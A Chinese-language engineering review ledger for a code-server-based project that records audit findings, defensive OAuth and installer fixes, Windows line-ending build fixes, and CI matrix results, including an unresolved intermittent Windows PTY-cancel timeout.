| P1-14及自查 | board固定临时名/无cleanup属实；额外确认坏板被静默覆盖；修复随机.tmp.、0600、finally及fail-closed | stateIntegrity坏板/rename失败/权限回归 |
| W4 新Windows矩阵 | 初次矩阵三个原失败已不再报错，但docsSite在Windows失败；readUtf8未统一Markdown CRLF，TOC/章节解析与Linux不同 | 全Markdown CRLF重跑真实builder的字节相等fixture；修复入口统一LF |
| P3-44 构建漂移 | 删除unused builtAt当天日期，docsSite不再日期豁免；失败不倾倒超大源码diff | 输出只由输入决定；用户M content.js可能来自日期/平台构建，不代表误操作 |

当前旧CI34852542412/34853003227的Windows新增全量有docsSite失败，不沿用“Windows全绿”说法；修复后须以新提交矩阵为准。未访问用户电脑，不宣称本机52/52通过。

最新矩阵cbafda6仍未全绿：Windows生成文件外层行尾也需固定LF（Markdown解析修正之外的第二层差异）；PTY取消在部分Windows runner挂起，增加阶段证据并改为30秒有限子进程+10秒及时关闭断言，避免无限fixture失控，不放宽取消通过条件。继续定位，不要求用户降级Node。

### 文档核实批次

P2-27/28/29/30/31和第二报告A1/B2/B4/D1/D2属实，已修工作区search_files误述、内置skill漏项、工作区trust/不存在端口开关、安装默认壳与源码简易入口口径、Bridge 200≠成功、生产依赖命令、遥测/CDN披露、扩展host地址配置。P1-16额外截图目录例外先明确披露，未改附件兼容协议；P1-23未vendor；P1-25保持本机UI政策，不为LAN扩大保护。

P3-43及OPT-E3“新测试漏登记静默漏检/新增测试必使runner失败”为误报：runner额外扫描.test.js，documentationLearning对全部manifest文件（含tests）强制关联。preferred是删除基线防护，不是唯一发现来源。P3-46关于const稍后声明构成TDZ也不能仅凭行号成立，调用发生在模块初始化后；secret固定长度比较不等于内容泄漏。不按这些建议重写。

报告整理采用“统一活台账+历史头注”，不批量删原报告，不把旧报告移入产品详解认证范围。其余未列为已修的OAuth9–12、安装17–19/21–22/34、UI24、性能/覆盖率/结构优化继续保留待办；更换工作区架构、后台自启、Git LFS/历史迁移需独立方案，不在本批擅自实施。

### 已取得的跨平台结果

提交7825e7a的CI运行34853878428：Ubuntu与Windows的Node20/22/24六个全量测试任务，以及Windows安装器任务全部成功。Windows Node24包含用户同版本24.20.0；原三个失败与新发现的文档漂移已通过矩阵。PTY取消测试使用有限30秒工作负载并保留10秒内完成的强断言，本轮CI通过不外推所有Windows进程树/真实桌面PTY场景。最新本地全量52/52通过；用户机器尚待更新后复验。

### OAuth交叉验证与修复（续）

- P1-9已复现：满80项后连错误注册都能撤销原合法token，新增回归在旧代码失败。现校验先于回收，只淘汰超过5分钟且无有效授权码/access/refresh的注册；全满503，保留活跃连接。URI数量/长度与名称长度有界。注册占位DoS没有完全消除。
- P1-10部分缓解：公开GET不再ensurePairing，GET/POST先验证授权输入、共用每IP30/分钟限流；限流Map过期回收、1000项上限。全局尝试预算仍fail-closed，不宣称杜绝码锁定攻击；本机主动生成/重启重配对政策不变。
- P1-11已修：URI仅HTTPS/HTTP回环，拒绝凭据/fragment/异常类型等；URL、S256 challenge、response_type和state在consumePairing之前验证。verifier校验43–128字符；none/post/basic回归仍通过。
- P1-12已复现并修：旧代码采信伪造转发Host，现只用本机配置公网origin或本机Host，挑战头规范化。自建代理必须配置公网origin，不能只依赖转发头；没有开放远程UI。
- 自查补充：其他客户端提交已消费refresh不得撤销不属于自己的token族；单客户端令牌数量上限等未在本批完成。

上述为自动化/源码结果，不代替手机第三方连接器验收。安装载荷及其余优化继续待办。

### 安装入口续查

- P1-17属实并修复：appOrigin统一CODE_SERVER_PORT，ready/轮询/Edge或默认浏览器使用同一origin；真实随机端口HTTP回归含200/503和非法配置。
- P1-18/19应区分生产依赖策略与测试入口缺陷：omit=dev不是生产启动错误，不把Acorn强塞生产依赖；run-tests.cmd现同时检查express/Acorn，缺任一则锁文件npm ci --include=dev。源码测试与安装载荷边界已注明。CMD实际执行仍待用户/Windows验证。
- P1-21定位有误但现象部分属实：syncExtension在scripts/ensure-code-server.js，不在installer/package.js；package白名单本身会复制extension下Markdown，运行时sync仍只拷JS/package/icon，旧目录清理与文档副本待修。P1-22/34（载荷文档站/死链）尚未完成，不仅靠加一个SUMMARY文件就宣称所有构建输入齐备。

### 最新CI反例：取消仍有间歇性失败

- OAuth提交80c72bf，运行34855147938：七项CI任务全通过。
- 安装入口提交31767dd，运行34855329666：Ubuntu20/22/24、Windows22/24及安装器通过；Windows20失败。失败为ptyLifecycle取消耗时30204ms，严格10秒断言命中，说明不能再用前两次绿灯外推取消稳定性。
- 当前源码Windows killChild用同步taskkill /T /F且未检查返回状态、未设自身期限；已确认这是诊断/健壮性缺口，但仅凭源码与30秒结果不能断言此次是taskkill失败、进程创建竞态还是继承管道问题。后续必须取得终止结果及父/子进程时序证据，不能仅关闭管道或放宽测试来制造通过。
- 最新本地全量仍52/52；用户第5步复验结果未收到，真实本机状态保持待验。当前审查不是“全部完成”。
